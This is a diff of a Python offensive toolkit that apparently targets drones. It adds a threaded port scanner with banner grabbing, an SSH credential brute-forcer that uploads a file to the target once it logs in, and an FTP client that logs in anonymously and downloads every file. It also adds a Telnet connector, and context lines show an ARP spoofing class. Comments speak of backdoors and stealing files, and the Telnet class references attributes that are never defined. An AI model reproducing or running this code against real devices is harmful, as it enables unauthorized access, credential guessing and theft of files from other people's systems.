@@ -12,6 +12,7 @@ from scapy.all import ARP, Ether, srp
 import ipaddress
 from datetime import datetime
 from ftplib import FTP
+import telnetlib
 import json
 from concurrent.futures import ThreadPoolExecutor
 
@@ -253,33 +254,7 @@ class WiFi_toolkit:
                     print("Invalid choice. Please enter a valid index.")
             except ValueError:
                 print("Invalid input. Please enter a number.")
-
-    def scan_ports(host):
-        def scan_port(port):
-            try:
-                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                    s.settimeout(1)  # Adjust timeout as needed
-                    s.connect((host, port))
-                    service = socket.getservbyport(port)
-                    print(f"Port {port} open: {service}")
-                    try:
-                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s_version:
-                            s_version.settimeout(1)  # Adjust timeout as needed
-                            s_version.connect((host, port))
-                            s_version.sendall(b"GET / HTTP/1.0\r\n\r\n")
-                            banner = s_version.recv(1024).decode("utf-8")
-                            print(f"Version: {banner.strip()}")
-                    except socket.error:
-                        pass
-            except socket.error:
-                pass
-
-        print(f"Scanning host: {host}")
-        with ThreadPoolExecutor(max_workers=50) as executor:
-            for port in range(1, 1001):  # Scan common ports
-                executor.submit(scan_port, port)
-
-                
+      
 # Get Drone Manufacturer
 class DroneSelector:
     def __init__(self):
@@ -308,8 +283,177 @@ class DroneSelector:
             print("Invalid input. Please enter a number.")
             return None
 
+# Port Scanning
+class PortScanner:
+    def __init__(self, target_host):
+        self.target_host = target_host
+        self.open_ports = []
 
-                
+    def scan_ports(self):
+        def scan_port(port):
+            try:
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                    s.settimeout(1)  # Adjust timeout as needed
+                    result = s.connect_ex((self.target_host, port))
+                    if result == 0:
+                        service = socket.getservbyport(port)
+                        self.open_ports.append((port, service))
+                        try:
+                            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s_version:
+                                s_version.settimeout(1)  # Adjust timeout as needed
+                                s_version.connect((self.target_host, port))
+                                s_version.sendall(b"GET / HTTP/1.0\r\n\r\n")
+                                banner = s_version.recv(1024).decode("utf-8")
+                                print(f"Version: {banner.strip()}")
+                        except socket.error:
+                            pass
+            except socket.error:
+                pass
+
+        print(f"Scanning host: {self.target_host}")
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            futures = [executor.submit(scan_port, port) for port in range(1, 1001)]  # Scan common ports
+            for future in futures:
+                future.result()  # Wait for all tasks to complete
+        return self.open_ports
+
+# SSH Hacking
+class SSHBruteForce:
+    def __init__(self, host, open_ports, usernames_file, passwords_file):
+        self.host = host
+        self.open_ports = open_ports
+        self.usernames_file = usernames_file
+        self.passwords_file = passwords_file
+
+    def check_ssh_port(self):
+        return any(port == 22 for port, _ in self.open_ports)
+    
+    def brute_force_ssh(self):
+        if not self.check_ssh_port():
+            print("[-] SSH port (22) is closed.")
+            return
+
+        with open(self.usernames_file, 'r') as users:
+            for username in users:
+                username = username.strip()
+                with open(self.passwords_file, 'r') as passwords:
+                    for password in passwords:
+                        password = password.strip()
+                        try:
+                            ssh = paramiko.SSHClient()
+                            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                            ssh.connect(self.host, port=22, username=username, password=password)
+                            print(f"[*] Found credentials: {username}:{password}")
+                            self.create_file_on_ssh(ssh)
+                            return
+                        except paramiko.AuthenticationException:
+                            print(f"[-] Invalid credentials: {username}:{password}")
+                        finally:
+                            ssh.close()
+
+    def create_file_on_ssh(self, ssh):
+        sftp = ssh.open_sftp()
+        sftp.put(localpath='PoC.txt', remotepath='/home/PoC.txt')
+        sftp.close()
+        print("[+] File 'PoC.txt' created on the drone.")
+
+# FTP Hacking
+class DroneFTPConnector:
+    def __init__(self, drone_ip, open_ports):
+        self.drone_ip = drone_ip
+        self.open_ports = open_ports
+        self.ftp = FTP()
+
+    def check_ftp_port(self):
+        return any(port == 21 for port, _ in self.open_ports)
+
+    def connect(self):
+        if not self.check_ftp_port():
+            print("[-] FTP port (21) is closed.")
+            return
+        try:
+            self.ftp.connect(self.drone_ip)
+            self.ftp.login()  # Null session login (anonymous)
+            print("Connected to FTP server successfully.")
+        except Exception as e:
+            print(f"Failed to connect to FTP server: {e}")
+
+    def list_files(self):
+        if not self.check_ftp_port():
+            return
+        try:
+            files = self.ftp.nlst()
+            print("Files in the current directory:")
+            for file in files:
+                print(file)
+        except Exception as e:
+            print(f"Failed to list files: {e}")
+
+    def download_files(self):
+        if not self.check_ftp_port():
+            return
+        try:
+            files = self.ftp.nlst()
+            print("Downloading files:")
+            for file in files:
+                with open(file, 'wb') as f:
+                    self.ftp.retrbinary('RETR ' + file, f.write)
+                    print(f"Downloaded {file}")
+        except Exception as e:
+            print(f"Failed to download files: {e}")
+
+    def disconnect(self):
+        if not self.check_ftp_port():
+            return
+        try:
+            self.ftp.quit()
+            print("Disconnected from FTP server.")
+        except Exception as e:
+            print(f"Error while disconnecting: {e}")
+
+# Telnet Hackin
+class TelnetConnector:
+    def __init__(self, drone_ip, open_ports):
+        self.drone_ip = drone_ip
+        self.open_ports = open_ports
+        self.telnet = telnetlib.Telnet()
+
+    def check_telnet_port(self):
+        return any(port == 23 for port, _ in self.open_ports)
+
+    def connect(self):
+        if not self.check_telnet_port():
+            print("[-] Telnet port (23) is closed.")
+            return
+        try:
+            self.telnet.open(self.host, self.port)
+            print("Connected to Telnet server successfully.")
+        except Exception as e:
+            print(f"Failed to connect to Telnet server: {e}")
+
+    def get_kernel_version(self):
+        try:
+            # Send command to get kernel version
+            self.telnet.write(b'uname -r\n')
+            
+            # Read response
+            kernel_version = self.telnet.read_until(b'\n').decode().strip()
+            
+            print("Kernel version:", kernel_version)
+        except Exception as e:
+            print(f"Failed to get kernel version: {e}")
+
+    def disconnect(self):
+        try:
+            self.telnet.close()
+            print("Disconnected from Telnet server.")
+        except Exception as e:
+            print(f"Error while disconnecting: {e}")
+
+
+# Drone Conroller
+            
+# Dump
 # ARP Spoofing & Vidieo Intercepting
 class ARPSpoofer:
     def __init__(self, target_ip, spoof_ip, interface):
@@ -339,71 +483,5 @@ class ARPSpoofer:
         print("[+] ARP spoofing stopped.")
 
 # Vieo Intercepting
-
-# SSH Connection and Building aa backdoor
-class SSHBruteForce:
-    def __init__(self, target_host, username_list, password_list, port=22):
-        self.target_host = target_host
-        self.port = port
-        self.username_list = username_list
-        self.password_list = password_list
-
-    def ssh_connect(self, username, password):
-        ssh_client = paramiko.SSHClient()
-        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-        try:
-            ssh_client.connect(self.target_host, port=self.port, username=username, password=password, timeout=5)
-            print(f"[+] Successfully logged in with {username}:{password}")
-            ssh_client.close()
-            return True
-        except (paramiko.AuthenticationException, socket.error) as e:
-            print(f"[-] Failed to login with {username}:{password}: {e}")
-            return False
-        except Exception as e:
-            print(f"[-] Error: {e}")
-            return False
-
-    def brute_force(self):
-        for username in self.username_list:
-            for password in self.password_list:
-                if self.ssh_connect(username, password):
-                    return True
-        return False
-
-# FTP Connection and stealing files
-
-class DroneFTPConnector:
-    def __init__(self, drone_ip):
-        self.drone_ip = drone_ip
-        self.ftp = FTP()
-
-    def connect(self):
-        try:
-            self.ftp.connect(self.drone_ip)
-            self.ftp.login()  # Null session login (anonymous)
-            print("Connected to FTP server successfully.")
-        except Exception as e:
-            print(f"Failed to connect to FTP server: {e}")
-
-    def list_files(self):
-        try:
-            files = self.ftp.nlst()
-            print("Files in the current directory:")
-            for file in files:
-                print(file)
-        except Exception as e:
-            print(f"Failed to list files: {e}")
-
-    def disconnect(self):
-        try:
-            self.ftp.quit()
-            print("Disconnected from FTP server.")
-        except Exception as e:
-            print(f"Error while disconnecting: {e}")
-
-# Turnon Camera 
-
-# Instruction Inejection
-
+            
 # main
